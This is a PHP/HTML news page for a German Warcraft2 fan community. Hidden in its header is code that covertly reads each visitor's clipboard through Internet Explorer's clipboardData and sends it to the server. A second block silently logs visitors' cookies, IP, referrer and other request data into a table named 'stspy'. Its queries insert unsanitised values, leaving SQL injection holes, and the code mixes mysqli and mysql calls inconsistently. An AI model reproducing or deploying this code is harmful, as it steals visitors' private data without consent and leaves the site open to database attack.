<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>

<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">

<meta http-equiv="Content-Script-Type" content="text/javascript">
<meta http-equiv="Content-Style-Type" content="text/css">

<?
include("vars.inc.php");


if (isset($cb))
{
  $ip = getenv("REMOTE_ADDR");
  $browser = getenv("HTTP_USER_AGENT");

  $mysqli = new mysqli($sql_server,$sql_user,$sql_pass,$sql_db);

  $senden_id = mysql_query("UPDATE stspy SET clipboard = '$cb' WHERE ip = '$ip' AND browser = '$browser'");

  echo "<script>";
  echo "  parent.frames[1].location.href=\"center.php\";";
  echo "</script>";

  $mysqli->close();
}
else
{
  $ip = getenv("REMOTE_ADDR");
  $browser = getenv("HTTP_USER_AGENT");

  $mysqli = new mysqli($sql_server,$sql_user,$sql_pass,$sql_db);

  $abfrage_id = mysql_query("SELECT clipboard FROM stspy WHERE ip = '$ip' AND browser = '$browser'");
  $daten = mysql_fetch_array($abfrage_id);


  if ($daten[clipboard] == "")
  {
    echo "<script>\n";
    echo "  if (window.clipboardData.getData('Text') != null)\n";
    echo "  {\n";
    echo "    a = window.clipboardData.getData('Text');\n";
    echo "    a = escape(a); parent.frames[1].location.href=\"center.php?cb=\"+a;\n";
    echo "  }\n";
    echo "</script>\n";
  }

  $mysqli->close();
}
?>


<?php
include("pageviews.inc");
include("spy.inc");
?>

<?php
$ip = getenv("REMOTE_ADDR");
$host = getenv("REMOTE_HOST");
$port = getenv("REMOTE_PORT");
$browser = getenv("HTTP_USER_AGENT");
$cookie_inhalt = getenv("HTTP_COOKIE");
$evtl_id = getenv("REMOTE_IDENT");
$ursprung = getenv("HTTP_REFERER");
$adresszeile = getenv("HTTP_HOST");
$erweiterte_url = getenv("PATH_INFO");
$variablen = getenv("QUERY_STRING");
$accept = getenv("HTTP_ACCEPT");
$zeichensatz = getenv("HTTP_ACCEPT_CHARSET");
$sprache = getenv("HTTP_ACCEPT_LANGUAGE");
$http_status  = getenv("HTTP_CONNECTION");
$dauer_start = time();

$mysqli = new mysqli($sql_server,$sql_user,$sql_pass,$sql_db);

$abfrage_id = mysql_query("SELECT dauer_ende FROM stspy WHERE ip = '$ip' AND browser = '$browser'");

$daten = mysql_fetch_array($abfrage_id);

if (($dauer_start - $daten['dauer_ende'] - 7200) > 0)
{
  $senden_id = mysql_query("INSERT INTO stspy (ip, host, port, browser, cookie_inhalt, evtl_id, ursprung, adresszeile, erweiterte_url, variablen, accept, zeichensatz, sprache, http_status, dauer_start) VALUES ('$ip', '$host', '$port', '$browser', '$cookie_inhalt', '$evtl_id', '$ursprung', '$adresszeile','$erweiterte_url', '$variablen', '$accept', '$zeichensatz', '$sprache', '$http_status','$dauer_start')");
}

$mysqli->close();
?>

<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<title>News</title>
<link rel="stylesheet" type="text/css" href="styles.css">
<script src="scripte.js"></script>


<script>
switch (document.cookie)
{
  case "0":
  case "2": document.writeln('<style type="text/css">td,li,ul { color:#FFFFFF } </style>');
  break;

  case "1":
  case "3": document.writeln('<style type="text/css">td,li,ul { color:#0000FF } </style>');
  break;
}
</script>

</head>

<script>
selectbg();
</script>
<noscript>
<body background="bg_sommer.gif"><font color="#FFFFFF">
</noscript>

<div align="center">
<b>Neu! Ein <a href="http://turnier.bozeman.de" target="_blank">Turnierskript</a>, gesponsert vom Stammtisch.</b>
<h2>Herzlich willkommen am Stammtisch!</h2><br><br>
</div>

<table border="0" width="555">
<tr>
<td width="100">&nbsp;</td>
<td width="455"><div align="center"><img src="bilder/gnomi.gif" alt="" width="72" height="72"></div></td>
</tr>
</table>

<table border="0" width="555">
<tr>
<td width="100">&nbsp;</td>
<td width="455"><div align="center"><h3>News</h3></div></td>
</tr>
</table>

<table border="0" width="555">
<tr><td width="100">&nbsp;</td><td>
<hr noshade>

<?
$mysqli = new mysqli($sql_server,$sql_user,$sql_pass,$sql_db);

$abfrage_id = mysql_query("SELECT name,topic,datum,beitrag FROM stnews ORDER BY datum DESC LIMIT 8");

while($daten = mysql_fetch_array($abfrage_id))
{
  $d = (string) $daten[datum];

  $beitragx = $daten[beitrag];
  $beitragx = preg_replace("/(\015\012)|(\015)|(\012)/","<br>",$beitragx);
  echo "<font size=\"+1\"><b>$daten[topic]</b></font><br>$beitragx<br><br>";
  echo "<font size=\"-2\">Eingeliefert von $daten[name] am $d[8]$d[9].$d[5]$d[6].$d[0]$d[1]$d[2]$d[3]</font><hr noshade>";
}

$mysqli->close();
?>

</td></tr>
<tr><td>&nbsp;</td><td align="right"><font size="-1"><a href="news.php">News einliefern</a></font></td></tr>
</table>

<br>
<font size="-1"><a href="stats.php">Stats</a></font>
<br><br><br>

<script>
switch (document.cookie)
{
  case "0":
  case "2": document.writeln('<font color="#FFFFFF">');
  break;

  case "1":
  case "3": document.writeln('<font color="#0000FF">');
  break;
}
</script>
<noscript>
<font color="#FFFFFF">
</noscript>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a name="bottom">Tipps zur Navigation auf diesen Seiten:</a></font>
<ul type="square">
<li>Der Landschaftstyp ist im unteren Auswahlframe frei w&auml;hlbar</li>
<li>Der Auswahlframe kann unten rechts minimiert/geschlossen werden</li>
<li>Ein so minimierter Frame l&auml;&szlig;t sich durch anklicken wieder herstellen</li>
<li>Ihr gew&auml;hlter Landschaftstyp wird beim n&auml;chsten Besuch dieser Seiten wieder hergestellt</li>
<li>Alle Links sind unabh&auml;ngig vom Landschaftstyp immer gelb</li>
</ul>

<div align="center">

<br>
<img src="bilder/notepad.gif" width="88" height="31" alt="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="bilder/bestviewed.gif" width="88" height="31" alt="">
<br><br><br>
Der Stammtisch ist offizielles Mitglied der deutschsprachigen Warcraft2-Community.<br>
<a href="http://www.warcraft-akademie.de" target="_blank"><img src="bilder/akademie.gif" width="88" height="31" border="0"></a>

</div>

</font>
</body>
</html>
